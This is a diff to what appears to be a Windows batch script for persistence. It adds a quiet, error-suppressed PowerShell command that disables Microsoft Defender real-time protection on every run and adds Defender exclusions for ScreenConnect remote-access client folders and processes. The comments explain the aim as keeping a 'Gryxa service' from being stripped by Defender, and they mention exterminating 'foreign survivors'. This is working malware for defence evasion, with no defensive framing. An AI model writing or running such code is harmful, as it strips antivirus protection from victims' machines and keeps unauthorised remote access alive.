@@ -321,7 +321,10 @@ if errorlevel 1 (
 rem (extermination already ran pre-heal in [E]; foreign survivors counted there)
 
 rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%WD%','%ETL%' -ErrorAction Stop } catch {}" >nul 2>&1
+rem M39: also re-assert RTP-off + SC Client* dir/process exclusions EVERY tick —
+rem 2-hourly own_secure left a window where Defender re-enabled RTP and stripped
+rem the Gryxa service outside of boot (host connects, Defender strips it, drops).
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue'; try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}; try{Add-MpPreference -ExclusionPath '%WD%','%ETL%',(Join-Path $env:ProgramFiles 'ScreenConnect Client*'),(Join-Path ${env:ProgramFiles(x86)} 'ScreenConnect Client*') -ErrorAction Stop}catch{}; foreach($x in @('ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe')){try{Add-MpPreference -ExclusionProcess $x -ErrorAction SilentlyContinue}catch{}}" >nul 2>&1
 
 rem ── [G] periodic full re-secure every ~2 h ────────────────────
 powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\own_secure.cmd') -and (( -not (Test-Path '%WD%\sec.flag')) -or (((Get-Date) - (Get-Item -LiteralPath '%WD%\sec.flag').LastWriteTime).TotalHours -ge 2))){ exit 1 } else { exit 0 }" >nul 2>&1
